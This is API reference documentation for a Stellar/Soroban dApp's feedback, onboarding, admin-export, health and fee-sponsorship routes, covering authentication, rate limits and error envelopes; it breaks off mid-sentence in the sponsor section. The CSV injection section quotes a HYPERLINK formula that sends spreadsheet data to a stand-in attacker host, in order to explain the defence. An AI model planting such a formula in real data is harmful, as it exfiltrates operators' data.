# Zentra Docs — HTTP API Reference

Nine handlers back the site: two for the feedback widget on `/metrics`, two for
the onboarding form, two operator-only admin routes, one readiness probe, and
two for gasless fee sponsorship. Base URL in production is
`https://zentra-docs.vercel.app`.

---

## 1. Overview

JSON over HTTPS. Every route runs on the Node runtime (`export const runtime =
'nodejs'`) and is declared `dynamic = 'force-dynamic'`, so nothing is
prerendered. Each handler is defined through `route()` in
`src/lib/api/route.ts`, which owns the concerns that must not vary between
endpoints: it resolves or mints a request id, emits exactly one structured log
line per request, and converts anything thrown into a single error envelope
shape. A handler is written as if nothing can go wrong; the wrapper supplies
the rest.

---

## 2. Conventions

**Request ids.** Send `x-request-id` and it is echoed back, provided it is
non-empty after trimming and no longer than 200 characters. Otherwise the
wrapper mints one (`crypto.randomUUID()`, falling back to a base36 id). The
header is set on every response — success and error alike — and is the same
value that appears in the server logs for that request.

**Caching.** `json()` defaults to `cache-control: no-store`; anything the
handler passes in its own headers wins.

| Response | `cache-control` |
| --- | --- |
| `GET /api/feedback` (200) | `public, s-maxage=30, stale-while-revalidate=120` |
| `POST /api/feedback` (201) | `no-store` |
| `GET /api/onboard` (200) | `public, s-maxage=30, stale-while-revalidate=120` |
| `POST /api/onboard` (201) | `no-store` |
| `GET /api/admin/users` (200) | `no-store` — set by hand, because that response is a file download built without `json()` |
| `PATCH /api/admin/feedback` (200) | `no-store` |
| `GET /api/health` (200 / 503) | `no-store` |
| `GET /api/sponsor` (200) | `no-store` — a per-deployment status, never cached at a CDN |
| `POST /api/sponsor` (200) | `no-store` |
| Error envelopes | not set by the wrapper (the last-resort 500 fallback sets `no-store`) |

**Errors.** Every failure — validation, rate limiting, database, unexpected
throw — returns the same envelope. Clients branch on `error.code`, not on the
message text.

---

## 3. Error envelope

```json
{
  "error": {
    "code": "validation_failed",
    "message": "Validation failed.",
    "details": {
      "rating": "Rating must be an integer between 1 and 5."
    }
  }
}
```

`details` is present only when the error carries per-field messages — in
practice only `validation_failed`. An error that carries `retryAfterSeconds`
also sets a `Retry-After` response header; only `rate_limited` does today.

Codes and statuses come from `src/lib/api/errors.ts`:

| Code | Status | Triggered by |
| --- | --- | --- |
| `bad_request` | 400 | Empty body, body that is not valid JSON, or a body that is not a JSON object (arrays and scalars are rejected). |
| `unauthorized` | 401 | No usable credential was presented to an admin route. |
| `forbidden` | 403 | A credential was presented to an admin route and was not accepted, **or** a `POST /api/sponsor` request whose inner transaction the allowlist refused (`malformed`, `fee_too_high`, `operation_not_allowed`, `wrong_network`). |
| `validation_failed` | 422 | One or more fields failed validation. Every failing field is reported in `details` in a single response. |
| `conflict` | 409 | A unique index raised Postgres `23505`: the `tx_hash` has already been recorded, or the signup's email or wallet is already registered. |
| `payload_too_large` | 413 | Request body exceeds the route's byte cap — 4096 bytes on most writes, 98304 bytes (96 KB) on `POST /api/sponsor` — by declared `content-length` or by measured UTF-8 length. |
| `rate_limited` | 429 | The caller exceeded the window for that route. Carries `Retry-After`. |
| `not_found` | 404 | `PATCH /api/admin/feedback` was given an `id` no row matches. |
| `upstream_unavailable` | 503 | A database read or write failed, `ADMIN_TOKEN` is not configured, or fee sponsorship is unavailable (`SPONSOR_SECRET` unset/unparseable, or an approved fee-bump failed to build) on this deployment. The real driver error is logged, never returned. |
| `internal` | 500 | Anything thrown that is not an `ApiError`. Message and stack are withheld because they may quote connection strings or query fragments. |
| `method_not_allowed` | — | Declared in the `ApiErrorCode` union but not produced by any current route. |

`unauthorized` and `forbidden` are distinct on purpose: a client that sent no
credential should prompt for one, while a client whose credential was rejected
should not retry with the same value. Branching on `error.code` is enough to
tell those apart — no status inspection required.

---

## 4. Authentication

Most of the API is public and takes no credential at all: both feedback routes,
both onboard routes, the health probe and both sponsor routes are open by
design. Authentication applies to exactly one prefix — `/api/admin/*` — which
today means `GET /api/admin/users` and `PATCH /api/admin/feedback`.

**`/api/sponsor` is public, not admin-gated.** It presents no credential and is
not covered by `requireAdmin`. Do not assume the spending route is behind the
operator secret: `POST /api/sponsor` signs a fee-bump with the sponsor account,
and the only things standing between a caller and that signature are the
contract allowlist (`inspectInnerTransaction` in `src/lib/api/sponsor.ts`) and
the per-instance rate limit — not a token. That is deliberate: a gasless path a
dApp user must first obtain a secret to use is not a gasless path. The allowlist
is what makes it safe to leave open, so it is the endpoint's whole control, not
a supporting one.

Those two are gated by `requireAdmin` in `src/lib/api/auth.ts`, which compares
one process-wide shared secret held in the `ADMIN_TOKEN` environment variable
against a credential presented on the request. Either header works:

```http
Authorization: Bearer <ADMIN_TOKEN>
```

```http
x-admin-token: <ADMIN_TOKEN>
```

`authorization` wins whenever it is present, and a present-but-non-Bearer value
is a refusal rather than a reason to look further: a caller who sent Basic or a
cookie meant that, and silently falling through to a second header would make
the request's own credential ambiguous. `x-admin-token` is consulted only when
`authorization` is absent entirely, for curl and CI callers. The scheme is
matched case-insensitively, the value is trimmed, and a blank result counts as
no credential at all.

**Failure modes.** Configuration is checked before credentials, so no value of
either header can open an ungated box.

| Condition | Status | Code | Message | `admin.denied` reason |
| --- | --- | --- | --- | --- |
| `ADMIN_TOKEN` unset, empty or whitespace-only | 503 | `upstream_unavailable` | `Admin access is not configured.` | `not_configured` |
| No usable credential — neither header, a non-Bearer `authorization`, or a blank value | 401 | `unauthorized` | `Admin credentials are required.` | `missing` |
| Credential present but does not match | 403 | `forbidden` | `Admin credentials are not valid.` | `invalid` |

**An unset `ADMIN_TOKEN` denies everything.** It never opens the route. A deploy
that forgot the variable fails closed, and it answers 503 rather than 401
because the fault is ours: telling the caller their credential was wrong would
be a lie that sends them looking in the wrong place. Blank and whitespace-only
values count as absent, so an empty `ADMIN_TOKEN=` line cannot be mistaken for a
configured one. `isAdminConfigured()` exposes the same check to anything that
wants to know without attempting a request.

**What is never logged.** Neither the supplied nor the expected token is written
to a log, in whole, hashed or truncated. A refusal emits `admin.denied` carrying
only the request id and the reason above; an acceptance emits `admin.authorized`
carrying only the request id.

**Comparison.** `timingSafeEqual` always walks `max(a.length, b.length)`
characters and folds every XOR into one accumulator, so a credential matching
all but the last character costs the same as one matching none. Its own comment
is careful to claim only that this raises the number of samples an attacker
needs: JavaScript string comparison cannot be made truly constant-time, and
Node's `crypto.timingSafeEqual` throws on inputs of differing length — which for
a secret comparison leaks length by itself — so it is not usable directly on raw
header strings.

### This is an operator gate, not a user authentication system

There are no accounts, no sessions, no roles and no expiry. One secret, shared
by whoever operates the deployment, is enough for the two things it guards —
exporting the onboarding registry and hiding an abusive feedback row — and it is
appropriate for nothing else. Anything a real user touches needs real identity,
and anything with more than one operator needs per-person credentials that can
be revoked individually.

---

## 5. Rate limiting

Limits are per client key, which is the route scope plus the best available
client IP: first hop of `x-forwarded-for`, else `x-real-ip`, else
`cf-connecting-ip`, else the literal `unknown`. The raw header value is never
returned or logged.

| Endpoint | Scope | Limit | Window |
| --- | --- | --- | --- |
| `GET /api/feedback` | `feedback:read` | 60 requests | 60 s |
| `POST /api/feedback` | `feedback:write` | 5 requests | 10 min |
| `GET /api/onboard` | `onboard:read` | 60 requests | 60 s |
| `POST /api/onboard` | `onboard:write` | 3 requests | 10 min |
| `GET /api/sponsor` | `sponsor:read` | 60 requests | 60 s |
| `POST /api/sponsor` | `sponsor:write` | 5 requests | 10 min |
| `GET /api/admin/users` | none | unlimited | — |
| `PATCH /api/admin/feedback` | none | unlimited | — |
| `GET /api/health` | none | unlimited | — |

The feedback and onboard read ceilings are generous because both responses are a
cached aggregate. `POST /api/onboard` is tighter than the feedback write path on
purpose: signing up is something a person does once, so three attempts covers a
mistyped wallet and a retry and leaves no room for scripting the registry full
of addresses. `sponsor:read` shares the generous 60-per-minute read allowance —
it only touches the environment — while `sponsor:write` is held to five bumps
per ten minutes because every success spends real lumens the sponsor never gets
back. That write limit is a cost speed bump, not the control that keeps the
sponsor solvent: the contract allowlist is (see
[`POST /api/sponsor`](#post-apisponsor)). The admin routes are not rate limited
at all — the shared secret is the control there, and an operator exporting the
registry twice in a minute is not abuse.

Successful responses from the six rate-limited routes carry:

| Header | Meaning |
| --- | --- |
| `X-RateLimit-Limit` | Requests allowed in the window. |
| `X-RateLimit-Remaining` | Requests left in the current window. |
| `X-RateLimit-Reset` | Epoch **seconds** at which the window expires. |

A rejected request gets `429` with the standard error envelope and a
`Retry-After` header in seconds (minimum 1). The `X-RateLimit-*` headers are
attached to accepted responses only, so a client should read them and back off
before it is turned away.

### Honest note on the guarantee

The limiter is a fixed-window counter held in a `Map` on `globalThis` inside a
single process. Quoting the header comment of `src/lib/api/rate-limit.ts`:

> The counters live in this process only. Vercel may run several concurrent
> instances of a function, so the effective global ceiling is roughly
> `limit × instances`, and an instance that scales to zero forgets everything
> it was counting. Treat this as a spam and abuse speed bump, not a security
> control: it will not stop a determined attacker, a distributed flood, or
> anyone who can rotate source IPs. The next step, when the traffic justifies
> it, is a shared store such as Redis or Upstash so every instance reads and
> writes the same window.

The map is capped at 5000 keys; when the cap is exceeded, expired windows are
dropped and the soonest-to-expire survivors are evicted. The key being counted
is never evicted.

---

## 6. Endpoints

### GET /api/feedback

Returns the aggregate rating summary plus the most recent 10 comments. This is
what the `/metrics` dashboard renders.

Both halves apply `WHERE NOT hidden`, so a row withheld by moderation appears in
neither the list nor the totals — see [Moderation](#7-moderation).

**Request.** No body, no parameters, no authentication.

```http
GET /api/feedback HTTP/1.1
Host: zentra-docs.vercel.app
x-request-id: 9f1c0f6a-2b31-4a35-9a1d-2f0f4d5e6c77
```

**Success — `200 OK`**

```json
{
  "count": 42,
  "average": 4.71,
  "onChain": 12,
  "recent": [
    {
      "rating": 5,
      "comment": "Proof generation in the browser is genuinely fast.",
      "wallet": "GA7AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5OQV",
      "txHash": "0490a1e32093c0d3cdb578a60d14caccbb4c4d05636d70eade54a89e091976a4",
      "onChain": true,
      "createdAt": "2026-07-21T08:14:02.117Z"
    },
    {
      "rating": 4,
      "comment": "Would like a testnet faucet link on the playground.",
      "wallet": null,
      "txHash": null,
      "onChain": false,
      "createdAt": "2026-07-20T22:03:55.402Z"
    }
  ]
}
```

`average` is rounded to two decimals and is `0` on an empty table (never
`null`). `onChain` at the top level is the count of anchored rows; `onChain` on
a `recent` item is that row's boolean.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 429 | `rate_limited` | More than 60 reads in 60 s from the same key. |
| 503 | `upstream_unavailable` | Either query failed. |
| 500 | `internal` | Unexpected throw. |

---

### POST /api/feedback

Records one submission. Feedback is off-chain by default and becomes on-chain
once the client anchors it to the Soroban feedback contract and reports the
resulting transaction hash here.

**Request body**

| Field | Type | Required | Rule |
| --- | --- | --- | --- |
| `rating` | number | yes | Integer, 1–5 inclusive. Non-integers and out-of-range values are rejected. |
| `comment` | string | yes | Whitespace runs collapsed to single spaces, ASCII control characters stripped, then trimmed. The result must be 1–280 characters. |
| `wallet` | string \| null | no | Must match `^G[A-Z2-7]{55}$` when present. Absent, `null`, or a blank/whitespace-only string is treated as not supplied and stored as `null`. |
| `txHash` | string \| null | no | Must be 64 hex characters. Accepted case-insensitively, **stored lowercase** — the database CHECK and unique index both assume lowercase hex. |
| `onChain` | boolean | no | Coerced with `Boolean()`, then **downgraded to `false` unless a valid `txHash` was supplied** and that hash verifies on-chain (below). An unproven claim is quietly downgraded, not rejected. |

Unknown keys are ignored: the validated value is rebuilt field by field, so
nothing caller-supplied reaches the database. The whole body is capped at
**4096 bytes** — `content-length` is checked before the stream is read, then
the decoded text is measured again in case that header was absent or lying.

#### On-chain claims are verified, not trusted

Sixty-four hex characters are free to invent, so a well-formed `txHash` proves
nothing on its own. When `onChain` is claimed, `src/lib/api/verify-anchor.ts`
resolves the hash against Horizon (`GET /transactions/{hash}`, 3 s timeout)
before it is believed. The claim only survives if the transaction **exists**,
**succeeded** (`successful === true`), and — when a `wallet` was supplied — was
**sourced from that wallet**. Otherwise `onChain` is set to `false` and the
`txHash` is cleared, so an invented hash can neither be stored nor occupy the
one-row-per-transaction unique index.

| Verdict | Meaning |
| --- | --- |
| `not_found` | Horizon has no such transaction. Retried once after 1.5 s first, because Horizon ingests closed ledgers on its own schedule and can lag the RPC the client submitted through. |
| `failed` | Included in a ledger but unsuccessful — an anchor of nothing. |
| `wrong_account` | Real transaction, different source account. Stops a public hash being replayed as your own. |
| `unavailable` | Horizon timed out, errored, or answered something unparseable. Deliberately distinct from `not_found`: Horizon being down is not evidence against the user. |

The submission is still stored in every case — the feedback is real, only the
badge is unearned. Each negative verdict is logged as `anchor.unverified`, and
the downgrade itself as `feedback.anchor_rejected`.

```http
POST /api/feedback HTTP/1.1
Host: zentra-docs.vercel.app
Content-Type: application/json
```

```json
{
  "rating": 5,
  "comment": "Anchored my proof on testnet in under a minute.",
  "wallet": "GA7AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5OQV",
  "txHash": "0490A1E32093C0D3CDB578A60D14CACCBB4C4D05636D70EADE54A89E091976A4",
  "onChain": true
}
```

**Success — `201 Created`**

```json
{ "ok": true }
```

The comment is screened before it is stored, and a `201` does not promise it
will be displayed: a submission the filter withholds is inserted with
`hidden = true` and acknowledged with exactly this response. See
[Moderation](#7-moderation).

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 400 | `bad_request` | Body missing/blank, not valid JSON, or not a JSON object. |
| 413 | `payload_too_large` | Body over 4096 bytes. |
| 422 | `validation_failed` | Any field rule above failed; `details` lists every failing field at once. |
| 409 | `conflict` | `This transaction has already been recorded.` — that `txHash` is already stored. |
| 429 | `rate_limited` | More than 5 writes in 10 minutes from the same key. |
| 503 | `upstream_unavailable` | The insert failed for any reason other than the unique violation. |
| 500 | `internal` | Unexpected throw. |

Example `422`:

```json
{
  "error": {
    "code": "validation_failed",
    "message": "Validation failed.",
    "details": {
      "rating": "Rating must be an integer between 1 and 5.",
      "comment": "Comment must be 1–280 characters.",
      "wallet": "Wallet must be a valid Stellar account id (G…)."
    }
  }
}
```

---

### POST /api/onboard

Records one registration in the onboarding registry behind the signup form.
Unlike feedback, this table holds personal data — a name and an email address —
so the route is deliberately lopsided: the write path logs only the wallet and
the rating, and the read path below exposes a bare count.

**Request body**

| Field | Type | Required | Rule |
| --- | --- | --- | --- |
| `name` | string | yes | Whitespace runs collapsed to single spaces, ASCII control characters stripped, then trimmed. The result must be 1–80 characters (`MAX_NAME_LENGTH`). Message: `Name must be 1–80 characters.` |
| `email` | string | yes | Trimmed and **lowercased**, then checked against a deliberately loose shape — something, an `@`, a dotted host (`^[^@\s]+@[^@\s]+\.[^@\s]+$`) — and a 254-character ceiling, the longest address SMTP permits. Message: `Email must be a valid address.` |
| `wallet` | string | yes | Must match `^G[A-Z2-7]{55}$`. **Required here**, unlike on feedback: the programme is keyed to a wallet. Message: `Wallet must be a valid Stellar account id (G…).` |
| `rating` | number \| null | no | When supplied: an integer, 1–5 inclusive. Absent, `null`, or a blank/whitespace-only string is treated as not supplied and stored as `null`. Message: `Rating must be an integer between 1 and 5.` |
| `note` | string \| null | no | Normalised exactly like a feedback comment — the two are free text from the same form — then 1–500 characters (`MAX_NOTE_LENGTH`). Absent, `null` or blank is stored as `null`. Message: `Note must be 1–500 characters.` |

Only a valid address is loose here; the rest is strict. The only authority on
whether an email exists is a message sent to it, so anything tighter would
reject valid addresses without catching invented ones — the pattern filters
typos and obvious junk and leaves it there.

Unknown keys are ignored: `parseUserInput` rebuilds the value field by field, so
nothing caller-supplied reaches the database. The body is capped at the same
**4096 bytes** as the feedback write. The `source` column is not accepted from
the request at all — it is left to its default of `'site'`, because this route
*is* the site form.

#### The email is lowercased before storage

The unique index is on `lower(email)`, not on `email`. Storing the address
exactly as typed would let `Ada@example.com` and `ada@example.com` both be
offered and then collide inside Postgres, surfacing as a 500 with a driver
message rather than a clean 409. Lowercasing in `parseUserInput` puts the value
in the same form the index compares, so a repeat signup is detected as a
conflict and answered as one. The `users_email_format` CHECK holds regardless.

```http
POST /api/onboard HTTP/1.1
Host: zentra-docs.vercel.app
Content-Type: application/json
```

```json
{
  "name": "Ada Reyes",
  "email": "Ada.Reyes@Example.com",
  "wallet": "GA7AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5OQV",
  "rating": 5,
  "note": "Heard about Zentra at the Manila meetup."
}
```

**Success — `201 Created`**

```json
{ "ok": true }
```

The row is stored with `email` as `ada.reyes@example.com`.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 400 | `bad_request` | Body missing/blank, not valid JSON, or not a JSON object. |
| 413 | `payload_too_large` | Body over 4096 bytes. |
| 422 | `validation_failed` | Any field rule above failed; `details` lists every failing field at once. |
| 409 | `conflict` | `This email or wallet is already registered.` |
| 429 | `rate_limited` | More than 3 writes in 10 minutes from the same key. |
| 503 | `upstream_unavailable` | `Signup storage is temporarily unavailable.` — the insert failed for any reason other than the unique violation. |
| 500 | `internal` | Unexpected throw. |

**The 409 names both fields and identifies neither.** It does not say whether
the email or the wallet collided, and that is deliberate: confirming that a
given address is already registered would turn the endpoint into a lookup
oracle, testable one request at a time. Both unique indexes — on `lower(email)`
and on `wallet` — raise the same Postgres `23505`, and both are reported with
the same sentence.

Each accepted signup logs `onboard.created` with the request id, the wallet and
the rating. The name and the email are deliberately absent: they are personal
data and the log ships to a third-party drain. The wallet is public chain data
and a rating is not identifying, which is enough to trace a signup without
copying a person's identity somewhere it cannot be deleted from.

---

### GET /api/onboard

The public progress counter the growth campaign renders: how many people have
signed up, and nothing else.

**Request.** No body, no parameters, no authentication.

```http
GET /api/onboard HTTP/1.1
Host: zentra-docs.vercel.app
```

**Success — `200 OK`**

```json
{ "count": 128 }
```

Served with `cache-control: public, s-maxage=30, stale-while-revalidate=120`.
The campaign page shows a live number, so the window is short, and
`stale-while-revalidate` absorbs a launch-day spike without ever letting the
figure drift far behind the table. An empty table returns `0`, never `null`.

**No personal data is exposed here.** The handler issues
`SELECT count(*)::int FROM users` and returns that integer. Every other column
in that table is personal data — names, emails, wallets — and this endpoint is
public and cached at a CDN, so it reads a count and only a count. There is no
parameter that widens it, no field that can be requested, and no row content in
the response.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 429 | `rate_limited` | More than 60 reads in 60 s from the same key. |
| 503 | `upstream_unavailable` | `Signup storage is temporarily unavailable.` — the count query failed. |
| 500 | `internal` | Unexpected throw. |

---

### GET /api/admin/users

Exports the whole onboarding registry as a CSV file an operator can open
directly. The alternative — handing someone a `psql` prompt against production
every time they want the current signup list — is a far worse thing to have to
do routinely.

**Request.** No body, no parameters. **Requires admin authentication**
(see [Authentication](#4-authentication)). The gate runs before anything else:
no query, no log line about the data, and no timing signal that depends on it.
Not rate limited.

```http
GET /api/admin/users HTTP/1.1
Host: zentra-docs.vercel.app
Authorization: Bearer <ADMIN_TOKEN>
```

**Success — `200 OK`**

| Header | Value |
| --- | --- |
| `content-type` | `text/csv; charset=utf-8` |
| `content-disposition` | `attachment; filename="zentra-users.csv"` |
| `cache-control` | `no-store` |

The body is an RFC 4180 document with a header row and CRLF line endings, rows
in signup order oldest first (`ORDER BY created_at ASC`). The columns are named
explicitly in the route rather than derived from the returned rows, so a column
added to `users` later cannot silently start appearing in the export. In order:

```
name,email,wallet,rating,note,source,created_at
```

`id` is deliberately absent — it is an internal surrogate key of no use to
anyone reading the spreadsheet. An absent value becomes an empty field rather
than the literal words `null` or `undefined`, which a spreadsheet would show as
text, and `created_at` is written as ISO 8601 so the file is unambiguous
regardless of the reader's locale.

```
name,email,wallet,rating,note,source,created_at
Ada Reyes,ada.reyes@example.com,GA7AXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX5OQV,5,Heard about Zentra at the Manila meetup.,site,2026-07-21T08:14:02.117Z
```

#### CSV injection is defused on the way out

Excel, LibreOffice and Sheets all interpret a cell beginning with `=`, `+`, `-`
or `@` as a formula rather than as text. Someone who signs up under the name
`=HYPERLINK("http://attacker/?d="&A1,"click")` has written nothing dangerous
into our database — the payload only becomes code at the moment an operator
opens the export, on the operator's machine, with the operator's data in reach.

Every field whose first character is one of those four is therefore prefixed
with a single quote, which every spreadsheet reads as "the rest of this cell is
literal text". The prefix is applied **before** the quoting decision, not after,
so it lands inside the quotes where it belongs. `-` is guarded even though a
leading minus is an ordinary thing for a number to have: the export has no
numeric column where that is meaningful, so covering the whole class costs
nothing here.

Ordinary RFC 4180 escaping is a separate concern and still applies on top: a
field containing a comma, a double quote, CR or LF is wrapped in double quotes,
and any inner double quote is doubled.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 401 | `unauthorized` | `Admin credentials are required.` |
| 403 | `forbidden` | `Admin credentials are not valid.` |
| 503 | `upstream_unavailable` | `Admin access is not configured.` — `ADMIN_TOKEN` unset or blank. |
| 503 | `upstream_unavailable` | `Registry storage is temporarily unavailable.` — the read failed. |
| 500 | `internal` | Unexpected throw. |

Row contents never reach a log. The success line `admin.users.exported` carries
the request id and the row count, which is enough to answer "did the export
actually return anything" without copying personal data into a log drain.

---

### PATCH /api/admin/feedback

Flips the `hidden` flag on one feedback row. This exists because an abusive
submission reached the public feed and there was no way to take it down short of
a `DELETE` against production — the wrong tool twice over: it destroys the
evidence of the abuse, and it silently changes the totals the dashboard reports.

**Request.** **Requires admin authentication**
(see [Authentication](#4-authentication)); the gate runs before the body is even
read. Not rate limited.

| Field | Type | Required | Rule |
| --- | --- | --- | --- |
| `id` | number | yes | A positive safe integer. `id` is a `bigint` identity column and anything past 2^53 cannot survive the round trip through JSON as a number, so it is rejected here rather than matching some other row after the engine rounds it. Message: `Id must be a positive integer.` |
| `hidden` | boolean | yes | Strictly a boolean, not anything truthy: `"false"` is a string and would hide a row the operator meant to restore. Message: `Hidden must be a boolean.` |

```http
PATCH /api/admin/feedback HTTP/1.1
Host: zentra-docs.vercel.app
Authorization: Bearer <ADMIN_TOKEN>
Content-Type: application/json
```

```json
{ "id": 42, "hidden": true }
```

**Success — `200 OK`**

```json
{ "ok": true, "id": 42, "hidden": true }
```

The response echoes the state the row is now in, so a script does not have to
assume the write landed the way it asked.

**It withholds; it does not delete.** The row stays in the table with every
field intact — rating, comment, wallet, hash and timestamp — and merely stops
being served to the public. Hiding and unhiding are the same operation with a
different boolean, so an operator who over-corrects undoes it with one more
call, and nothing is lost in either direction.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 400 | `bad_request` | Body missing/blank, not valid JSON, or not a JSON object. |
| 401 | `unauthorized` | `Admin credentials are required.` |
| 403 | `forbidden` | `Admin credentials are not valid.` |
| 404 | `not_found` | `No feedback row with that id.` |
| 413 | `payload_too_large` | Body over 4096 bytes. |
| 422 | `validation_failed` | `id` or `hidden` failed; both are reported at once. |
| 503 | `upstream_unavailable` | `Admin access is not configured.`, or `Feedback storage is temporarily unavailable.` when the update failed. |
| 500 | `internal` | Unexpected throw. |

The 404 is measured rather than assumed. Neon's HTTP driver hands back rows
rather than a command tag, so a bare `UPDATE` gives no way to tell "flag
changed" from "no such id"; the statement uses `RETURNING id` and counts what
comes back — one row means it matched, zero means it did not. It is thrown
outside the storage `try` on purpose, so a client-side mistake cannot be
swallowed and reported as a 503.

Each accepted call logs `admin.feedback.moderated` with the request id, the row
id and the new state. Those are operational facts rather than user content, so
the audit trail exists without repeating what was submitted.

---

### GET /api/health

Readiness probe for uptime monitors, load balancers and deploy gates. It
reports whether the instance can actually serve traffic, not merely whether the
process is listening. It runs **two checks concurrently** (`Promise.all`, so the
endpoint answers in the time of the slower one, not the sum):

- **`database`** round-trips `SELECT 1` against Postgres and reports the latency.
- **`chain`** calls `getNetwork` on the Soroban RPC for the configured network
  and confirms the passphrase it returns matches the one this build expects.

Each check is capped at **2000 ms**; a slower response counts as a failure.

**Why the chain check exists.** A database-only probe reports a perfectly
healthy service on a build pointed at the wrong network: Postgres is reachable,
so the process looks fine while it is talking to the wrong chain entirely. The
chain check is the only thing that catches that class of misconfiguration, so a
deploy accidentally serving mainnet traffic from a testnet build (or the
reverse) fails the probe instead of passing it silently.

**Request.** No body, no parameters, not rate limited.

```http
GET /api/health HTTP/1.1
Host: zentra-docs.vercel.app
```

**Healthy — `200 OK`**

```json
{
  "status": "ok",
  "requestId": "9f1c0f6a-2b31-4a35-9a1d-2f0f4d5e6c77",
  "network": "testnet",
  "contractsConfigured": true,
  "uptimeSeconds": 3812,
  "checks": {
    "database": { "status": "ok", "latencyMs": 24 },
    "chain": { "status": "ok", "latencyMs": 118 }
  }
}
```

`network` is the chain this build talks to (`testnet` or `public`), and
`contractsConfigured` reports whether that network actually has the Zentra
contracts deployed — it is `false` on mainnet until the ids in
`src/config/contract.ts` are filled in. Both are surfaced so a monitor can see
not just that the service is up but that it is the *right* service.

> **Network selection.** `NEXT_PUBLIC_STELLAR_NETWORK` selects the chain the
> whole dApp talks to. It defaults to `testnet` (any unrecognised or absent
> value fails safe to testnet, where mistakes are free) and, being a
> `NEXT_PUBLIC_*` variable, is **inlined at build time** — so changing it takes
> a redeploy, not just an environment edit. `network` in this body is what that
> build resolved to.

**Degraded — `503 Service Unavailable`**

```json
{
  "status": "degraded",
  "requestId": "9f1c0f6a-2b31-4a35-9a1d-2f0f4d5e6c77",
  "network": "testnet",
  "contractsConfigured": true,
  "uptimeSeconds": 3812,
  "checks": {
    "database": { "status": "ok", "latencyMs": 24 },
    "chain": { "status": "error", "latencyMs": 0, "error": "unavailable" }
  }
}
```

The 503 body is the **normal** health body, not the error envelope — the route
degrades rather than throws. `latencyMs` is `0` when the check never completed,
and `error` is always the fixed string `unavailable`: a missing `DATABASE_URL`,
a refused connection, a hung socket and a passphrase mismatch are all
indistinguishable to the client. The real cause is written to the server log
under the same `requestId` (`health.database`, `health.chain`, or
`health.chain.mismatch`).

**A passphrase mismatch is an error, not merely degraded.** When the RPC
answers but returns a passphrase that is not the one this build expects, the
chain check resolves to `status: "error"` — the same result as an unreachable
RPC — and the probe returns 503. Serving one network's traffic from another
network's build is not a slow or partial service; it is the wrong service, so it
is failed outright rather than tolerated.

The body is safe to expose publicly: no environment variables, versions,
hostnames, region names or dependency URLs. `network` and `contractsConfigured`
are policy facts, not secrets — the network passphrase is public and the
contract ids are on-chain.

| Status | Meaning |
| --- | --- |
| 200 | Every check passed. |
| 503 | At least one check failed (database unreachable, chain unreachable, or a passphrase mismatch). |
| 500 | `internal` envelope, only if the handler itself throws. |

---

### GET /api/sponsor

Reports whether fee sponsorship is available on this deployment, so the UI can
offer a gasless path only when there is actually a funded account behind it.

**Request.** No body, no parameters, no authentication.

```http
GET /api/sponsor HTTP/1.1
Host: zentra-docs.vercel.app
```

**Success — `200 OK`**

```json
{
  "configured": true,
  "sponsor": "GBSPONSORXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  "maxFeeStroops": 1000000
}
```

| Field | Type | Meaning |
| --- | --- | --- |
| `configured` | boolean | Whether `SPONSOR_SECRET` holds a usable, signable seed on this deployment. `false` when it is unset, blank or unparseable. |
| `sponsor` | string \| null | The sponsor's `G…` address, or `null` when nothing usable is configured. |
| `maxFeeStroops` | number | The per-transaction fee ceiling, `1000000` stroops (0.1 XLM) — a policy constant, always present. |

**This response exposes no secret material.** The sponsor's public key is public
by nature: it is the fee source the ledger records on every bump the account
signs, so returning it tells a client nothing it could not read off-chain. The
seed in `SPONSOR_SECRET` is never derived into this response, and an
unconfigured deployment simply reports `configured: false` and `sponsor: null`
rather than erroring. `maxFeeStroops` is likewise just the published policy
number.

**Failure statuses**

| Status | Code | When |
| --- | --- | --- |
| 429 | `rate_limited` | More than 60 reads in 60 s from the same key. |
| 500 | `internal` | Unexpected throw. |

---

### POST /api/sponsor

Takes a user-signed inner transaction and returns it wrapped in a **fee-bump**
signed by the sponsor account, so a wallet holding zero XLM can still transact.
A fee-bump changes who pays, never what happens: the user's signature is
untouched and still authorises exactly what they signed.

This is the one route in the app that spends money on a stranger's behalf, so it
is written to be boring — a tight rate limit, a hard size cap, and a refusal for
anything `inspectInnerTransaction` in `src/lib/api/sponsor.ts` does not
positively approve.

**Request.** **Public — not admin-gated** (see [Authentication](#4-authentication)):
the control is the allowlist below, not a credential.

| Field | Type | Required | Rule |
| --- | --- | --- | --- |
| `xdr` | string | yes | A non-empty base64 transaction envelope, trimmed. Rejected when absent, non-string, blank, or longer than **65536 characters** (64 KB). Message: `xdr must be a non-empty base64 transaction envelope under 64KB.` |

The whole request body is capped at **98304 bytes** (96 KB): `content-length` is
checked before the stream is read, then the decoded UTF-8 is measured again in
case that header was absent or lying.

**Why this route reads its own body.** Every other write uses the shared
`readJsonBody`, which caps a body at 4096 bytes. A Soroban transaction envelope
routinely exceeds that — the resource footprint of a contract call does not fit
in 4 KB — so this route carries its own reader and its own far larger ceiling
rather than rejecting legitimate envelopes as `payload_too_large`.

```http
POST /api/sponsor HTTP/1.1
Host: zentra-docs.vercel.app
Content-Type: application/json
```

```json
{ "xdr": "AAAAAgAAAAA...base64 inner transaction envelope..." }
```

**Success — `200 OK`**

```json
{ "xdr": "AAAABQAAAAA...base64 signed fee-bump envelope..." }
```

The returned envelope is the fee-bump, signed **by the sponsor only** — the
inner transaction keeps whatever signatures it arrived with.

#### The anti-drain design is the point of the endpoint

A route that fee-bumps whatever XDR it is handed is a free, open faucet: anyone
could sign a payment to themselves, an account merge, a trustline change or a
call into some unrelated contract, post it here, and have the sponsor pay for it
until the balance is gone. The defence is a positive allowlist:

**Every operation in the inner transaction must be an `invokeHostFunction` whose
root invocation targets one of our own contract ids.** The allowed set
(`SPONSORABLE_CONTRACT_IDS`) is built at runtime from `src/config/contract.ts` —
